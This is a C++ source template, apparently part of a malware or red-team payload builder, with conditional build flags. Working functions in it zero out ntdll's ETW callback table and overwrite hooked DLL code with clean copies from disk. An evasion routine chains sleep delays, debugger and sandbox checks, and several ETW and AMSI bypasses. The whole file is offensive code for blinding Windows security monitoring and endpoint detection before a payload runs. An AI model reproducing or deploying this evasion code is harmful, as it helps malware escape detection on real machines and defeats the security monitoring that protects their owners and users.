{{#IF ETW_CALLBACK_REMOVE}}
// ETW Callback Removal
static void bypass_etw_callback_remove() {
    // Walk the EtwpNotificationTable and NULL function pointers
    // This requires finding the internal table via pattern scanning ntdll
    HMODULE hNtdll = GetModuleHandleW(obf_wide(L"ntdll.dll"));
    if (!hNtdll) return;

    // Pattern scan for EtwpNotificationTable reference in EtwEventRegister
    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hNtdll);
    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<BYTE*>(hNtdll) + dos->e_lfanew);
    auto text = reinterpret_cast<BYTE*>(hNtdll) + nt->OptionalHeader.BaseOfCode;
    size_t text_size = nt->OptionalHeader.SizeOfCode;

    // Look for LEA pattern referencing the notification table
    for (size_t i = 0; i + 7 < text_size; i++) {
        // lea rcx, [rip+offset] = 48 8D 0D XX XX XX XX
        if (text[i] == 0x48 && text[i+1] == 0x8D && text[i+2] == 0x0D) {
            int32_t offset;
            memcpy(&offset, text + i + 3, 4);
            void* table = text + i + 7 + offset;
            // Verify it's in ntdll's data section range
            if (table > (void*)hNtdll &&
                table < (void*)(reinterpret_cast<BYTE*>(hNtdll) + nt->OptionalHeader.SizeOfImage)) {
                // Zero first few callback entries
                DWORD old;
                VirtualProtect(table, 256, PAGE_READWRITE, &old);
                memset(table, 0, 256);
                VirtualProtect(table, 256, old, &old);
                break;
            }
        }
    }
}
{{#ENDIF}}

// ==================== DLL UNHOOKING ====================
{{#IF UNHOOK_DLLS}}
static void unhook_dll(const wchar_t* dll_name) {
    HMODULE hMod = GetModuleHandleW(dll_name);
    if (!hMod) return;

    wchar_t path[MAX_PATH];
    GetSystemDirectoryW(path, MAX_PATH);
    lstrcatW(path, L"\\");
    lstrcatW(path, dll_name);

    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return; }

    LPVOID clean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!clean) { CloseHandle(hMap); CloseHandle(hFile); return; }

    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hMod);
    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<BYTE*>(hMod) + dos->e_lfanew);
    auto section = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            DWORD old;
            auto text = reinterpret_cast<BYTE*>(hMod) + section[i].VirtualAddress;
            auto clean_text = reinterpret_cast<BYTE*>(clean) + section[i].VirtualAddress;
            SIZE_T sz = section[i].Misc.VirtualSize;
            VirtualProtect(text, sz, PAGE_EXECUTE_READWRITE, &old);
            memcpy(text, clean_text, sz);
            VirtualProtect(text, sz, old, &old);
            break;
        }
    }

    UnmapViewOfFile(clean);
    CloseHandle(hMap);
    CloseHandle(hFile);
}
{{#ENDIF}}

// ==================== MASTER EVASION INIT ====================
static bool evasion_init() {
{{#IF SLEEP}}
    evasion_sleep({{SLEEP_SECONDS}});
{{#ENDIF}}

{{#IF ANTI_DEBUG}}
    if (check_debugger()) return false;
{{#ENDIF}}

{{#IF SANDBOX}}
    if (check_sandbox()) return false;
{{#ENDIF}}

{{#IF UNHOOK_DLLS}}
    {{UNHOOK_DLL_CALLS}}
{{#ENDIF}}

    // ETW bypass (before AMSI, since AMSI may trigger ETW)
{{#IF ETW_COMPLUS}}
    bypass_etw_complus();
{{#ENDIF}}
{{#IF ETW_UNHOOK_NTDLL}}
    bypass_etw_unhook_ntdll();
{{#ENDIF}}
{{#IF ETW_HWBP}}
    bypass_etw_hwbp();
{{#ENDIF}}
{{#IF ETW_PROVIDER_DISABLE}}
    bypass_etw_provider_disable();
{{#ENDIF}}
{{#IF ETW_PATCH_ETWWRITE}}
    bypass_etw_patch_etwwrite();
{{#ENDIF}}
{{#IF ETW_PATCH_NTTRACE}}
    bypass_etw_patch_nttrace();
{{#ENDIF}}
{{#IF ETW_CALLBACK_REMOVE}}
    bypass_etw_callback_remove();
{{#ENDIF}}

    // AMSI bypass
{{#IF AMSI_HWBP}}
    bypass_amsi_hwbp();
{{#ENDIF}}
{{#IF AMSI_CONTEXT_CORRUPT}}
    bypass_amsi_context_corrupt();
{{#ENDIF}}
{{#IF AMSI_PROVIDER_DEREGISTER}}
    bypass_amsi_provider_deregister();
{{#ENDIF}}
{{#IF AMSI_NTCREATESECTION_HOOK}}
    // NtCreateSection hook would need to be installed early
{{#ENDIF}}
{{#IF AMSI_CLR_PATCH}}
    bypass_amsi_clr_patch();
{{#ENDIF}}
{{#IF AMSI_PATCH}}
    bypass_amsi_patch();
{{#ENDIF}}

    return true;
}
